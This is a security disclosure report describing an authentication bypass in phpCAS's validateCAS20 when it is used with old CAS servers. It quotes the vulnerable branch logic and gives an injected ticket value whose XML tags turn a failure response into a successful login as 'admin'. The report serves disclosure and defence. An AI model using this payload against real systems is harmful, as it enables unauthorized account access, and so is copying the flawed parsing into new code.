@@ -1,0 +1,33 @@
+Authentication bypass in validateCAS20
+
+
+Hello,
+I found a way to abuse failure message from old CAS server to bypass authentication, even if latest phpCAS is used.
+The CAS20 validation function is like this:
+//from line 3166 of https://github.com/Jasig/phpCAS/blob/master/source/CAS/Client.php
+public function validateCAS20(&$validate_url,&$text_response,&$tree_response, $renew=false)
+{
+	//some checks
+	} else if ($tree_response->getElementsByTagName("authenticationSuccess")->length != 0) {
+		//success
+	} else if ( $tree_response->getElementsByTagName("authenticationFailure")->length != 0) {
+		//failure
+	} else {//exception and stuff
+}
+
+A normal authenticationFailure message is like this:
+<cas:serviceResponse xmlns:cas='http://www.yale.edu/tp/cas'>
+  <cas:authenticationFailure code='INVALID_TICKET'>
+    ticket 'ST-1234-d0VsoOn9nd0xEjVSnVXd' not recognized
+  </cas:authenticationFailure>
+</cas:serviceResponse>
+In old CAS server version, it was possible to inject xml tag in the ticket so that the failure message become:
+<cas:serviceResponse xmlns:cas='http://www.yale.edu/tp/cas'>
+  <cas:authenticationFailure code='INVALID_TICKET'>
+    ticket 'ST-1234-d0VsoOn9nd0xEjVSnVXd</cas:authenticationFailure><cas:authenticationSuccess><cas:user>admin</cas:user></cas:authenticationSuccess><cas:authenticationFailure code='INVALID_TICKET'>' not recognized
+  </cas:authenticationFailure>
+</cas:serviceResponse>
+Now check the php code above and guess what happens: authentication success! The authenticationfailure elements are ignored.
+Again, this is only possible when latest phpCas is configured to authenticate against old CAS server. Still, that does exist.
+Some other CAS clients might also be vulnerable, I didn't verify though.
+Dau Huy Ngoc from Deloitte France
